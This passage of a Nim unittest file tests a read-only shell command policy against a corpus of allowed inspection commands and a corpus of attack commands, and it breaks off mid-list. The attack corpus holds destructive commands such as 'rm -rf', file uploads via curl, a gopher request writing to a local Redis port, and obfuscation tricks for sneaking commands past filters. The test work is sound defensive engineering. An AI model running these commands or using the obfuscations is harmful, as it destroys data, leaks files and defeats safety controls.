## Adversarial tests for the mandatory get v3 read-only command policy.
##
## The safe corpus measures compatibility with realistic inspection commands.
## The attack corpus covers shell grammar, obfuscation, interpreters, wrappers,
## write-capable flags, remote mutation, and platform-specific state changes.

{.experimental: "strictFuncs".}

import std/[strutils, unittest]

import command_policy

const SafeCorpus = [
  "pwd",
  "uname -a",
  "ls -la",
  "ls ./*.nim",
  "ls -- *",
  "/usr/bin/ls -1 /tmp",
  "C:\\Windows\\System32\\whoami.exe",
  "dir /b",
  "cat README.md",
  "cat *.nimble",
  "head -n 20 README.md",
  "tail -n 20 README.md",
  "tail -n 50 /var/log/messages",
  "wc -l README.md",
  "wc -l < README.md",
  "wc -l <'README.md'",
  "wc -l < 'path with spaces.txt'",
  "wc -l < path\\ with\\ spaces.txt",
  "grep needle < README.md | wc -l",
  "sha256sum 0< README.md",
  "cat < README.md > /dev/null",
  "cut -d: -f1 /etc/passwd",
  "tr a-z A-Z",
  "grep -R 'rm|delete|drop' src",
  "rg 'git checkout|Set-Content' src tests",
  "rg --files | head",
  "find . -maxdepth 2 -type f | head",
  "find . -executable -type f | head",
  "find ~ -maxdepth 3 -type f | head",
  "find \"$HOME\" -maxdepth 3 -name '*.ini' | head",
  "rg TODO \"$PWD\" | head",
  "git -C \"$PWD\" branch --show-current",
  "fd -t f README",
  "fd -- --exec .",
  "fd -H -- --exec .",
  "fd -g -- --exec .",
  "fd -j 4 -t f README",
  "rg -- --pre README.md",
  "rg -n -- --pre README.md",
  "rg --threads=4 TODO src",
  "jq -r '.name' package.json",
  "printf 'a b\\n' | awk '{print $1, $2}'",
  "printf '1 75 process\\n' | awk '$2>50 {print $2, $3}'",
  "awk -F: '$1==\"root\" {print $1}' /etc/passwd",
  "printf 'a b\\n' | awk '$1!=$2 {print $1, $2}'",
  "printf 'a b\\n' | awk 'NR==1 {print $1}'",
  "printf 'a b\\n' | awk 'NF>1 {print $NF}'",
  "printf 'a b\\n' | awk 'NF>1 {print $NF} NF==1 {print \"(no ext)\"}'",
  "awk 'NR<=2 {print $1} NR>2 {print \"(rest)\"}' README.md",
  "printf 'a b\\n' | awk '{print $1; exit}'",
  "printf 'a b\\n' | awk '{print $0}'",
  "printf 'a b\\n' | awk '{print NR, NF, $NF}' -",
  "awk -F: '{print $1}' /etc/passwd",
  "awk '{print $1}' < README.md",
  "awk --field-separator=: 'NR<=2 {print $1}' /etc/passwd",
  "git ls-files --others --exclude-standard | awk '!/^\\.ci\\//' | wc -l",
  "git ls-files --others --exclude-standard | awk '/^\\.ci\\//' | " &
    "awk -F/ '{print $2}' | sort | uniq -c | head",
  "sed -n '1,20p' README.md",
  "sed -n '/Harness/p' README.md",
  "sed -n -e '1p' -e '$p' README.md",
  "sed -ne '1,5p' README.md",
  "sed '20q' README.md",
  "sed -E 's/.*\\.//' README.md",
  "sed 's/needle/replacement/12' README.md",
  "launchctl print system | sed -n '/services = {/,/^[[:space:]]*}/p' | " &
    "head -n 170",
  "launchctl print system | grep -o '\"[^\"]*\" = {' | " &
    "sed 's/ = {//' | head -n 170",
  "find . -type f | sed 's|^\\./||; s|/[^/]*$||' | sort | uniq -c",
  "printf '%s\\n' a.nim b.py | sed 's/.*\\.//' | sort | uniq -c",
  "sed -n '1p' -",
  "sed -n '1,5p' < README.md",
  "sort README.md",
  "sort --stable README.md",
  "sort -- -o",
  "sort --stable -- -o",
  "sort -c -- -o",
  "sort -m -- -o",
  "sort --parallel=4 README.md",
  "printf '%s\\n' a b | sort | uniq -c",
  "printf '%s' -value",
  "uniq -",
  "sleep 0",
  "sleep 0.25s",
  "seq 5",
  "seq -2 2",
  "seq 1 2 9",
  "echo $HOME",
  "echo \"$HOME\"",
  "echo ${HOME}",
  "ls -d \"${PWD}\"",
  "grep '$HOME' README.md",
  "ls -d $HOME",
  "cat ~/README.md",
  "diff -u README.md README.md",
  "diff -- --output left.txt",
  "tree -L 2",
  "tree -- --output",
  "tree -a -- --output",
  "tree -C -- --output",
  "xxd README.md",
  "xxd -",
  "xxd -rps dump.txt",
  "stat README.md",
  "file README.md",
  "file -- --preserve-date",
  "file -b -- --preserve-date",
  "file -c -- --preserve-date",
  "du -sh .",
  "df -h",
  "free -h",
  "free -s 1 -c 3",
  "free --seconds=.5 --count=5",
  "free -c 2",
  "free -h && uname -a",
  "ls -la; echo ---; cat *.nimble",
  "grep -R TODO src || true",
  "grep -R absent src; echo \"exit=$?\"",
  "top -bn1 | head -n 15",
  "top -b -n 1",
  "top -bHn2 -d 0.5 -w120",
  "top -b -n 5 -d 10 -o %CPU | head -n 20",
  "top --batch-mode --iterations=1 --pid=1,2 --width=120",
  "top --batch-mode --iterations 2 --delay .5 --filter-only-euser root",
  "top -l 1 -n 0",
  "top -l 1 -n 15 -o cpu",
  "top -l1 -n15 -stats pid,cpu,mem",
  "top -l 5 -s 10 -ncols 160 -pid 0",
  "top -h",
  "nproc",
  "lsmem --summary=only",
  "lsns --type pid",
  "lsipc",
  "lslocks",
  "lsmod",
  "modinfo loop",
  "pmap 1",
  "pidof get",
  "sw_vers -productVersion",
  "system_profiler -listDataTypes",
  "ioreg -l | head -n 1",
  "lsb_release -a",
  "biosdecode",
  "cpuid -1",
  "acpi -V",
  "glxinfo -B",
  "clinfo --list",
  "rocminfo",
  "vm_stat",
  "vm_stat -c 3 1",
  "getenforce",
  "sestatus",
  "aa-status --enabled",
  "apparmor_status --json",
  "systemd-detect-virt",
  "systemd-cgls --all",
  "numastat",
  "numactl --hardware",
  "auditctl -s",
  "auditctl -l",
  "swapon --show --bytes",
  "losetup --list --noheadings",
  "smartctl -a /dev/sda",
  "smartctl --scan-open",
  "smartctl -l selftest /dev/sda",
  "lshw -short",
  "lshw -class network -sanitize",
  "upower --dump",
  "upower --show-info /org/freedesktop/UPower/devices/battery_BAT0",
  "ethtool eth0",
  "ethtool -i eth0",
  "ethtool -S eth0",
  "sensors",
  "sensors -A",
  "whoami",
  "id -u",
  "uptime",
  "printenv PATH",
  "locale",
  "host example.com",
  "dig +short example.com",
  "nslookup example.com",
  "nslookup -type=A example.com 1.1.1.1",
  "ping -c 1 127.0.0.1",
  "ping -w 2 127.0.0.1",
  "traceroute -n -m 5 -q 1 -w 1 127.0.0.1",
  "traceroute --max-hops=5 --queries=1 --wait=1 127.0.0.1",
  "tracert -d -h 5 -w 1000 127.0.0.1",
  "tracepath -n -m 5 127.0.0.1",
  "hostname -I | awk '{print $1}'",
  "ip -4 addr show | awk '/inet / {print $2, $NF}'",
  "netstat -an",
  "lsof -p 1",
  "lsof -nP -iTCP -sTCP:LISTEN",
  "ps aux | head",
  "pgrep -a ssh",
  "pgrep -- --signal",
  "vmstat 1 2",
  "vmstat",
  "iostat 1 2",
  "mpstat 1 2",
  "sar 1 2",
  "sar -P ALL 1 2",
  "pidstat 1 2",
  "pidstat -p ALL 1 2",
  "lsblk -f",
  "lscpu",
  "sha256sum README.md",
  "file README.md",
  "file -b README.md",
  "base64 README.md",
  "base64 -- -o",
  "base64 -d -- --output",
  "base64 -d encoded.txt",
  "strings get-macos-arm64 | head",
  "date +%Y",
  "date -u +%FT%TZ",
  "date -d yesterday +%F",
  "hostname",
  "hostname -f",
  "dmesg --level=err",
  "findmnt --target /",
  "mount -l",
  "mount -t ext4",
  "mount -O no_netdev",
  "blkid -o list",
  "dmidecode -t system",
  "udevadm info /sys/class/net/lo",
  "ss -ltnp",
  "arp -a",
  "route print",
  "ip addr show",
  "ip -j route show",
  "ip route get 127.0.0.1",
  "ifconfig",
  "ifconfig en0",
  "resolvectl status",
  "resolvectl query example.com",
  "resolvectl log-level",
  "networkctl status",
  "rfkill list",
  "ipconfig /all",
  "nmcli device status",
  "nmcli -t -f NAME connection show",
  "netsh interface ip show config",
  "ufw status verbose",
  "firewall-cmd --state",
  "firewall-cmd --zone public --list-all",
  "firewall-cmd --get-active-zones",
  "nft -j list ruleset",
  "nft list table inet filter",
  "iptables -L -n -v",
  "iptables -S",
  "iptables -C INPUT -p tcp --dport 22 -j ACCEPT",
  "systemctl status sshd",
  "systemctl list-units --type=service",
  "systemctl --failed --no-pager",
  "systemctl list-timers --all --no-pager",
  "systemctl list-jobs --no-pager",
  "systemctl get-default",
  "systemctl is-system-running",
  "journalctl -n 20 --no-pager",
  "journalctl --cursor s=0123456789abcdef",
  "timedatectl status",
  "loginctl list-sessions",
  "sysctl kernel.hostname",
  "hostnamectl status",
  "hostnamectl --static",
  "localectl status",
  "localectl list-locales",
  "service --status-all",
  "service ssh status",
  "systemd-analyze blame",
  "systemd-analyze critical-chain",
  "crontab -l",
  "crontab -u root -l",
  "atq",
  "atq -q a",
  "tmux list-sessions",
  "tmux -L diagnostics list-windows -a",
  "tmux list-panes -a -F '#{pane_pid} #{pane_current_command}'",
  "tmux display-message -p '#S:#I.#P'",
  "mokutil --sb-state",
  "mokutil --list-enrolled --verbose",
  "nvidia-smi",
  "nvidia-smi -L",
  "nvidia-smi --query-gpu=name,memory.total --format=csv,noheader",
  "nvidia-smi dmon -c 1",
  "nvidia-smi dmon -c=2 -d=1",
  "nvidia-smi pmon --count=2 --delay=1",
  "nvidia-smi topo -m",
  "nvidia-smi topo -p -i 0,1",
  "nvidia-smi nvlink -R -i 0",
  "nvidia-smi nvlink -c",
  "nvidia-smi c2c -s",
  "nvidia-smi encodersessions -i 0",
  "nvidia-smi vgpu -q -i 0",
  "nvidia-smi vgpu -fs -i 0",
  "nvidia-smi power-hint -gc 1200 -t 60 -p 0",
  "nvidia-smi pci -gErrCnt -i 0",
  "nvidia-smi prm -f -n NV_PMC_BOOT_0 -i 0",
  "rocm-smi",
  "rocm-smi --showuse --showmeminfo vram",
  "rocm-smi -d 0 --showproductname --showmemuse",
  "rocm-smi --showtopo --json",
  "curl -q -fsSL https://example.com",
  "curl -q -x http://127.0.0.1:8080 -fsSL https://example.com",
  "curl -q -I https://example.com",
  "curl -q -X GET https://example.com",
  "curl -q --request=HEAD https://example.com",
  "curl -q --url=https://example.com",
  "curl -q --parallel --parallel-max 4 https://example.com https://example.org",
  "curl -q https:example.com",
  "curl -q -o- https://example.com",
  "curl -q --max-time 2 -H 'Accept: application/json' " &
    "'https://example.com/?q=test'",
  "wget --no-config --no-hsts -qO- https://example.com",
  "wget --no-config --no-hsts -qO- " &
    "--header='Accept: application/json' https://example.com",
  "git --no-pager log -5 --oneline",
  "git log HEAD -- --show-signature",
  "git tag --list 'v*' -- --delete",
  "git --no-pager log --color=never -1",
  "git log --format '%h %s' -1",
  "git diff --cached --no-ext-diff --no-textconv --stat",
  "git diff-files --name-only --no-ext-diff --no-textconv",
  "git show --no-ext-diff --no-textconv --stat HEAD",
  "git grep 'rm -rf'",
  "git rev-parse --show-toplevel",
  "git ls-files",
  "git ls-files --others --exclude-standard | awk '!/^\\.ci\\//' | head",
  "git branch --show-current",
  "git branch -vv --no-color",
  "git branch --list 'release/*'",
  "git tag --list 'v*'",
  "git config --get user.name",
  "git config --list --show-origin",
  "git remote -v",
  "git remote get-url origin",
  "git remote -v get-url --push origin",
  "git worktree list",
  "git reflog show -5",
  "git submodule status",
  "docker ps",
  "docker stats --no-stream",
  "docker stats --no-stream=true",
  "docker events --until 0s",
  "docker logs --tail 50 container-name",
  "docker logs --follow=false --tail 50 container-name",
  "docker inspect container-name",
  "docker container ls",
  "docker image history image-name",
  "docker compose ps",
  "podman images",
  "kubectl get pods -A",
  "kubectl get pods --watch=false",
  "kubectl logs --follow=false --tail=50 example",
  "kubectl -n default describe pod example",
  "kubectl auth can-i get pods",
  "kubectl config current-context",
  "apt list --installed",
  "apt-cache policy bash",
  "dnf info bash",
  "dnf history list",
  "dnf history info 1",
  "dnf module list",
  "zypper list-updates",
  "pacman -Q bash",
  "brew info bash",
  "brew info homebrew/core/bash",
  "brew outdated",
  "brew services list",
  "winget search PowerShell",
  "winget upgrade",
  "choco outdated",
  "pip list",
  "pip3 show requests",
  "npm view react version",
  "cargo search serde",
  "nimble list -i",
  "rpm -qa",
  "rpm -qi bash",
  "dpkg --list",
  "apk info",
  "snap list",
  "flatpak list",
  "tar -tf archive.tar",
  "tar -tfarchive.tar",
  "tar -tvb20 -f archive.tar",
  "tar -tf archive.tar --blocking-factor=20",
  "tar -tf archive.tar --record-size=10240",
  "tar --force-local -tf name:archive.tar",
  "unzip -l archive.zip",
  "unzip -p archive.zip README.md",
  "zipinfo archive.zip",
  "gzip -l archive.gz",
  "gzip -dc archive.gz",
  "xz -dc archive.xz",
  "xz -c -T4 source.bin",
  "xzcat archive.xz",
  "zcat archive.gz | head",
  "python3 --version",
  "node --version",
  "nim --version",
  "openssl version",
  "go version",
  "go env GOOS GOARCH GOROOT",
  "go env -json GOOS GOARCH",
  "dotnet --info",
  "dotnet --list-sdks",
  "rustup show active-toolchain",
  "rustup toolchain list",
  "rustup target list --installed",
  "swift -print-target-info",
  "xcodebuild -showsdks",
  "java -XshowSettings:properties -version",
  "launchctl list",
  "launchctl print system",
  "scutil --dns",
  "scutil --get ComputerName",
  "diskutil list",
  "defaults read NSGlobalDomain AppleLocale",
  "mdutil -s /",
  "mdls -name kMDItemContentType README.md",
  "mdfind -onlyin . 'kMDItemFSName == *.nim'",
  "xattr -l README.md",
  "xattr -p com.apple.quarantine README.md",
  "pkgutil --pkgs",
  "pkgutil --pkg-info com.apple.pkg.CLTools_Executables",
  "plutil -lint Info.plist",
  "plutil -p Info.plist",
  "xcode-select -p",
  "log show --last 1m --style compact",
  "pmset -g batt",
  "pmset -g assertions",
  "networksetup -listallhardwareports",
  "networksetup -getinfo Wi-Fi",
  "csrutil status",
  "csrutil authenticated-root status",
  "spctl --status",
  "fdesetup status",
  "systemextensionsctl list",
  "nvram -p",
  "profiles status -type enrollment",
  "profiles help",
  "profiles version",
  "profiles list -output stdout",
  "profiles show -output=stdout-xml",
  "tmutil status",
  "kextstat -l",
  "ipconfig getifaddr en0; route -n get default",
  "df -h /; tmutil status",
  "csrutil status; spctl --status; fdesetup status",
  "scutil --dns | head -n 80",
  "Get-Location",
  "Write-Output $HOME",
  "Get-ChildItem $HOME | Select-Object -First 1",
  "Get-ChildItem -Force | Select-Object -First 10",
  "Get-Content README.md | Select-Object -First 5",
  "Get-Content README.md -Tail 20",
  "Get-Content README.md -ReadCount 128",
  "Get-Content README.md -ReadCount:4096",
  "Get-Process | Sort-Object CPU | Select-Object -First 5",
  "Get-Process | Where-Object Name -eq bash",
  "Get-Process | Write-Output '@items'",
  "Get-FileHash README.md",
  "Get-ScheduledTask | Select-Object -First 5",
  "Get-Service | Where-Object Status -eq Running | Select-Object -First 20",
  "Get-WinEvent -LogName System -MaxEvents 20",
  "Get-NetFirewallProfile; Get-MpComputerStatus",
  "Get-Disk; Get-Volume; Get-BitLockerVolume",
  "Get-ScheduledTask | Select-Object -First 20",
  "Get-NetIPConfiguration",
  "Get-DnsClientServerAddress",
  "Get-NetFirewallProfile",
  "Get-NetFirewallRule | Select-Object -First 5",
  "Get-NetNeighbor",
  "Get-NetConnectionProfile",
  "Get-DnsClientCache",
  "Get-PSDrive",
  "Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion",
  "Get-LocalGroupMember Administrators",
  "Get-ScheduledTaskInfo -TaskName Example",
  "Get-BitLockerVolume",
  "Get-Tpm",
  "Get-MpComputerStatus",
  "Get-AppxPackage | Select-Object -First 5",
  "Get-WindowsOptionalFeature -Online",
  "Get-WindowsCapability -Online",
  "Get-ProcessMitigation -System",
  "Test-NetConnection localhost -Port 22",
  "Test-Connection localhost -Count 2",
  "Test-Connection localhost -Count 2 -BufferSize 64 -ThrottleLimit 4",
  "Confirm-SecureBootUEFI",
  "Resolve-DnsName example.com",
  "Get-NetIPInterface",
  "Get-NetAdapterStatistics -Name Ethernet",
  "Get-MpThreatDetection",
  "Get-PhysicalDisk",
  "Get-Counter '\\Processor(_Total)\\% Processor Time' -MaxSamples 2",
  "Get-Counter '\\Processor(_Total)\\% Processor Time' " &
    "-MaxSamples 2 -SampleInterval 1",
  "Get-Help Get-Content",
  "Resolve-Path ~",
  "ConvertTo-Json 'value'",
  "reg query HKCU\\Software",
  "sc query type= service",
  "wevtutil el",
  "certutil -hashfile README.md SHA256",
  "cmdkey /list",
  "tzutil /g",
  "tzutil /l",
  "powercfg /getactivescheme",
  "powercfg /availablesleepstates",
  "powercfg /requests",
  "schtasks /query /fo csv /nh",
  "wmic cpu get Name,NumberOfCores",
  "wmic service list brief",
  "dism /Online /Get-Packages /English",
  "dism /Online /Cleanup-Image /CheckHealth",
  "dism /Online /Cleanup-Image /ScanHealth",
  "dism /Online /Cleanup-Image /AnalyzeComponentStore",
  "fsutil fsinfo drives",
  "net start",
  "net user",
  "net user Administrator",
  "net localgroup Administrators",
  "net share",
  "net statistics workstation",
  "query user",
  "bcdedit /enum all /v",
  "manage-bde -status C:",
  "manage-bde -protectors -get C:",
  "fltmc filters",
  "wsl --list --verbose",
  "wsl --status",
  "test -e README.md",
  "[ -f README.md ]",
  "uname -a 2>/dev/null",
  "uname -a 2>&1 | head"
]

const AttackCorpus = [
  "rm -rf ./data",
  "/bin/rm -rf ./data",
  "r''m -rf ./data",
  "r\"\"m -rf ./data",
  "r\\m -rf ./data",
  "./rm -rf ./data",
  "/tmp/ls -la",
  "/tmp/windows/system32/ls -la",
  "/usr/bin/../../../tmp/ls -la",
  "C:\\Windows\\System32\\..\\Temp\\whoami.exe",
  "touch marker",
  "mkdir marker",
  "cp a b",
  "mv a b",
  "chmod 777 file",
  "chown root file",
  "ln -s a b",
  "dd if=/dev/zero of=file",
  "printf value > result.txt",
  "printf value >> result.txt",
  "printf value 2> result.txt",
  "printf value > nul",
  "cat <<EOF",
  "cat <<< value",
  "cat <> input.txt",
  "cat <&3",
  "cat < <(touch marker)",
  "cat < $(touch marker)",
  "cat < `touch marker`",
  "cat < *.txt",
  "cat < $INPUT_FILE",
  "cat < \"$INPUT_FILE\"",
  "cat < ~",
  "cat < first.txt < second.txt",
  "cat < 'unterminated",
  "cat < ''",
  "cat < input.txt; touch marker",
  "curl -q --config - < options.txt",
  "python3 < script.py",
  "Get-Content < input.txt",
  "pwd; rm -rf data",
  "pwd && rm -rf data",
  "pwd || rm -rf data",
  "pwd & rm -rf data",
  "pwd\nrm -rf data",
  "pwd | sh",
  "pwd | bash",
  "pwd | xargs rm",
  "$(printf rm) -rf data",
  "`printf rm` -rf data",
  "${MUTATOR} file",
  "$MUTATOR file",
  "$'rm' -rf data",
  "%ComSpec% /c del file",
  "!MUTATOR! file",
  "r^m -rf data",
  "(rm -rf data)",
  "r{m,} -rf data",
  "eval 'rm -rf data'",
  "exec rm -rf data",
  "env rm -rf data",
  "command rm -rf data",
  "sudo rm -rf data",
  "doas rm -rf data",
  "nice rm -rf data",
  "timeout 5 rm -rf data",
  "watch rm -rf data",
  "make target",
  "python3 -c 'open(\"x\",\"w\")'",
  "python3 script.py",
  "python3 -m pip install package",
  "node -e 'require(\"fs\").writeFileSync(\"x\",\"y\")'",
  "perl -e 'unlink q(x)'",
  "ruby -e 'File.write(\"x\",\"y\")'",
  "php -r 'file_put_contents(\"x\",\"y\");'",
  "sed -i 's/a/b/' file",
  "sed --in-place=.bak '1p' file",
  "sed 'w result.txt' file",
  "sed -n '1p;2e touch marker' file",
  "sed -e '1p' -e '2w result.txt' file",
  "sed -f untrusted.sed file",
  "sed --file=untrusted.sed file",
  "sed -n '/needle/e touch marker' file",
  "sed 's/a/b/e' file",
  "sed 's/a/b/w result.txt' file",
  "sed 's/a/b/12w result.txt' file",
  "sed 's/a/b/0' file",
  "sed 's/a/b/;e touch marker' file",
  "sed 's/a/b/;w result.txt' file",
  "sed 's/a/b/;s/c/d/e' file",
  "awk 'BEGIN { system(\"touch x\") }'",
  "awk '{ print > \"result.txt\" }'",
  "awk -f untrusted.awk",
  "awk --load=untrusted '{print $1}'",
  "awk 'NR==1 {print $1; system(\"touch x\")}'",
  "awk '$1==system(\"touch x\") {print $1}' README.md",
  "awk '$1=$2 {print $1}' README.md",
  "awk 'NF>1 {print $NF} NF==1 {system(\"touch x\")}'",
  "awk 'NF>1 {print $NF} NF==1 {print > \"result.txt\"}'",
  "awk '{print $1 | \"touch x\"}'",
  "awk '{getline value < \"input\"; print value}'",
  "awk '{print tolower($1)}'",
  "awk '!/^\\.ci\\// {system(\"touch x\")}'",
  "awk '!/^\\.ci\\//; system(\"touch x\")'",
  "awk '/safe/ > \"result.txt\"'",
  "yes",
  "yes x | grep x",
  "free -s 1",
  "free --seconds=1",
  "free -s 0 -c 2",
  "free -c 6",
  "free -s 11 -c 2",
  "sleep 11",
  "sleep forever",
  "sleep 1 2",
  "seq 100001",
  "seq 1 0 10",
  "seq 1 100001",
  "printf $HOME; uname -a",
  "find . -delete",
  "find . -exec rm {} +",
  "find . -fprintf result.txt '%p\\n'",
  "find $HOME -type f",
  "find \"$USER\" -type f",
  "fd -x rm {}",
  "fd -xrm {}",
  "fd -t -- --exec rm {}",
  "fd -j 100000 README",
  "rg --pre 'rm -rf data' pattern",
  "rg -g -- --pre=helper pattern .",
  "rg -j99999 pattern .",
  "rg --dfa-size-limit=100G pattern .",
  "sort -o result.txt input.txt",
  "sort -k -- -o result.txt input.txt",
  "sort -oresult.txt input.txt",
  "sort --compress-program='rm -rf data' input.txt",
  "sort -T /tmp input.txt",
  "sort --temporary-directory=/tmp input.txt",
  "sort --out=result.txt input.txt",
  "sort *",
  "sort -* input.txt",
  "sort ~",
  "diff --output=result.patch a b",
  "diff --out=result.patch a b",
  "tree -o result.txt",
  "tree -oresult.txt",
  "tree -L -- --output result.txt",
  "uniq input.txt output.txt",
  "uniq - output.txt",
  "xxd -r dump.txt output.bin",
  "xxd input.bin output.txt",
  "xxd - output.txt",
  "xxd ~",
  "base64 -o result.txt input.bin",
  "base64 -oresult.txt input.bin",
  "base64 -w -- --output result.txt",
  "yq -i '.a=1' file.yaml",
  "yq --in-pl '.a=1' file.yaml",
  "yq -iy '.a=1' file.yaml",
  "yq --split-exp='.a' file.yaml",
  "file -C -m custom.magic",
  "file -m -- --preserve-date README.md",
  "file -p README.md",
  "file -bp README.md",
  "file --preserve-date README.md",
  "nslookup",
  "nslookup -",
  "nslookup -debug",
  "pgrep --signal TERM bash",
  "sar -o activity.bin 1 1",
  "ping -f 127.0.0.1",
  "ping 127.0.0.1",
  "ping -i 0.01 127.0.0.1",
  "ping -c 999999 127.0.0.1",
  "top",
  "top -b",
  "top -n 1",
  "top -bn0",
  "top -bn6",
  "top -b -n 1 -d 10.1",
  "top -b -n 5 -d 10.0001",
  "top -b --iterations=6",
  "top -b -n 1 --width=513",
  "top -b -n 1 --pid=1,bad",
  "top -b -n 1 --unknown",
  "top -l 0",
  "top -l 6",
  "top -l 1 -s 10.1",
  "top -l 1 -i 11",
  "top -l 1 -ncols 513",
  "top -l 1 -pid bad",
  "top -l 1 -n -1",
  "top -l 1 -n 1000000",
  "top -l 1 -unknown value",
  "tail -f /var/log/messages",
  "tail -F /var/log/messages",
  "tail --retry /var/log/messages",
  "tail *",
  "tail $HOME",
  "lsof +r 1",
  "lsof *",
  "findmnt --poll",
  "vmstat 1",
  "iostat 1",
  "mpstat 1",
  "vmstat 11 1",
  "iostat 1 6",
  "sar 1",
  "sar 11 1",
  "sar 1 6",
  "pidstat 1",
  "pidstat 11 1",
  "pidstat -e touch marker",
  "pidstat --exec=touch marker",
  "pidstat --ex touch marker",
  "traceroute -m 65 127.0.0.1",
  "traceroute -q 6 127.0.0.1",
  "traceroute --quer=999 127.0.0.1",
  "traceroute --wait=10.1 127.0.0.1",
  "traceroute -M /tmp/untrusted 127.0.0.1",
  "traceroute --module=../../untrusted 127.0.0.1",
  "tracert -h 65 127.0.0.1",
  "tracert -w 10001 127.0.0.1",
  "tracepath -m 65 127.0.0.1",
  "sensors -s",
  "sensors -As",
  "sensors --set",
  "smartctl --smart=on /dev/sda",
  "smartctl -t long /dev/sda",
  "smartctl -X /dev/sda",
  "smartctl -l sasphy,reset /dev/sda",
  "smartctl -l scterc,70,70 /dev/sda",
  "lshw -dump hardware.db",
  "lshw -X",
  "upower --monitor",
  "ethtool -s eth0 speed 1000",
  "ethtool -K eth0 tso off",
  "ethtool --cable-test eth0",
  "numactl --membind=0 touch marker",
  "auditctl -e 0",
  "auditctl -D",
  "swapon /swapfile",
  "swapon --all",
  "losetup -f disk.img",
  "losetup -d /dev/loop0",
  "date --set='2030-01-01'",
  "date 010100002030",
  "hostname changed-host",
  "hostname -F host.txt",
  "hostname -Fhost.txt",
  "dmesg -C",
  "dmesg --read-clear",
  "dmesg -Tc",
  "dmesg -w",
  "dmesg --follow-new",
  "ss -K dst 127.0.0.1",
  "ss -tK dst 127.0.0.1",
  "ss -E",
  "ss --events",
  "netstat 1",
  "route monitor",
  "ipconfig set en0 DHCP",
  "ipconfig setverbose 1",
  "vm_stat 1",
  "vm_stat -c 1000 1",
  "arp -d 127.0.0.1",
  "route add default gateway 127.0.0.1",
  "route ad default gateway 127.0.0.1",
  "ip link set eth0 down",
  "ip link se eth0 down",
  "ip route fl table main",
  "ip route flush table main",
  "ip -batch commands.txt",
  "ip monitor",
  "ipconfig /release",
  "ipconfig /flushdns",
  "nmcli connection down id test",
  "nmcli connection modify test ipv4.method auto",
  "nmcli connection clone test cloned",
  "nmcli connection import type wireguard file test.conf",
  "nmcli device wifi hotspot",
  "nmcli monitor",
  "nmcli device monitor",
  "nmcli general hostname changed-host",
  "netsh interface ip set address name=x static 1.2.3.4",
  "ufw enable",
  "ufw allow 22/tcp",
  "firewall-cmd --reload",
  "firewall-cmd --zone=public --add-service=http",
  "nft add table inet demo",
  "nft -f ruleset.nft",
  "iptables -A INPUT -j DROP",
  "iptables -F",
  "iptables -L -Z",
  "iptables -L --modprobe=helper",
  "iptables -L -M /tmp/helper",
  "iptables -LM/tmp/helper",
  "netsh interface ip set address name=x dhcp show",
  "systemctl restart sshd",
  "systemctl restart status",
  "systemctl enable sshd",
  "systemctl is-system-running --wait",
  "systemctl help sshd",
  "systemctl -H remote.example status sshd",
  "systemctl --image=untrusted.raw status",
  "journalctl --vacuum-time=1s",
  "journalctl -f",
  "journalctl --setup-keys",
  "journalctl --cursor-file=cursor.state",
  "journalctl --cursor-f cursor.state",
  "timedatectl set-timezone UTC",
  "timedatectl -H remote.example status",
  "timedatectl set-timezone status",
  "loginctl terminate-user alice",
  "loginctl terminate-user list-users",
  "sysctl -w kernel.hostname=changed",
  "sysctl kernel.hostname=changed",
  "hostnamectl set-hostname changed",
  "localectl set-locale LANG=C",
  "service ssh restart",
  "systemd-analyze set-log-level debug",
  "crontab -e",
  "crontab -r",
  "crontab schedule.txt",
  "atq unexpected",
  "tmux new-session -d",
  "tmux kill-session -t diagnostics",
  "tmux send-keys -t 0 'rm -rf data' Enter",
  "tmux display-message changed",
  "tmux list-panes -F '#(touch marker)'",
  "tmux display-message -p '#(rm -rf data)'",
  "tmux -f untrusted.conf list-sessions",
  "mokutil --disable-validation",
  "mokutil --import owner.der",
  "mokutil --export",
  "nvidia-smi -pm 1",
  "nvidia-smi --power-limit=100",
  "nvidia-smi --mig-mode=1",
  "nvidia-smi --multi-instance-gpu=1",
  "nvidia-smi -p 0",
  "nvidia-smi --virt-mode=3",
  "nvidia-smi --dram-encryption=1",
  "nvidia-smi --set-hostname=changed",
  "nvidia-smi --toggle-led=1",
  "nvidia-smi --filename=result.txt",
  "nvidia-smi -qf result.txt",
  "nvidia-smi mig -cgi 1",
  "nvidia-smi -l 1",
  "nvidia-smi --loop=1",
  "nvidia-smi dmon",
  "nvidia-smi dmon -c 1 -f result.csv",
  "nvidia-smi pmon -c 6",
  "nvidia-smi encodersessions -l 1",
  "nvidia-smi fbcsessions --loop=1",
  "nvidia-smi nvlink -sc 0",
  "nvidia-smi nvlink --setcontrol=0",
  "nvidia-smi nvlink -r",
  "nvidia-smi nvlink -re",
  "nvidia-smi nvlink -sLowPwrThres 1",
  "nvidia-smi nvlink -sBwMode 1",
  "nvidia-smi nvlink -sLWidth 1",
  "nvidia-smi vgpu -caa",
  "nvidia-smi vgpu -shm 1",
  "nvidia-smi vgpu -smts 1",
  "nvidia-smi vgpu set-scheduler-state -i 0",
  "nvidia-smi pci -cErrCnt -i 0",
  "nvidia-smi topo --future-control=1",
  "nvidia-smi stats",
  "nvidia-smi clocks --lock=1500",
  "nvidia-smi compute-policy --set-timeslice=1",
  "nvidia-smi boost-slider --set=1",
  "nvidia-smi gpm --enable",
  "nvidia-smi power-smoothing --set=1",
  "nvidia-smi unknown-future-control --set=1",
  "nvidia-smi --future-control=1",
  "nvidia-smi --set-future-mode=1",
  "nvidia-smi --id -- --future-control=1",
  "rocm-smi -r",
  "rocm-smi --resetfans",
  "rocm-smi --setfan 100",
  "rocm-smi --setf 100",
  "rocm-smi --gpureset -d 0",
  "rocm-smi --load settings.json",
  "rocm-smi --save settings.json",
  "rocm-smi --rasenable gfx ue",
  "curl -X POST https://example.com",
  "curl -XDELETE https://example.com/item",
  "curl --request=PATCH https://example.com/item",
  "curl --data x=1 https://example.com",
  "curl --json '{}' https://example.com",
  "curl -F file=@x https://example.com",
  "curl -T file https://example.com",
  "curl --upload-file=file https://example.com",
  "curl -o file https://example.com",
  "curl -O https://example.com/file",
  "curl -D headers.txt https://example.com",
  "curl -K evil.conf https://example.com",
  "curl --trace trace.txt https://example.com",
  "curl --libcurl generated.c https://example.com",
  "curl --write-out '%output{result.txt}x' https://example.com",
  "curl -q --output=result.txt https://example.com",
  "curl -q -o nul https://example.com",
  "curl -q gopher://127.0.0.1:6379/_SET%20key%20value",
  "curl -q gopher:127.0.0.1/_SET%20key%20value",
  "curl -q --url=smtp://127.0.0.1",
  "curl -q -H 'X-HTTP-Method-Override: DELETE' https://example.com/item",
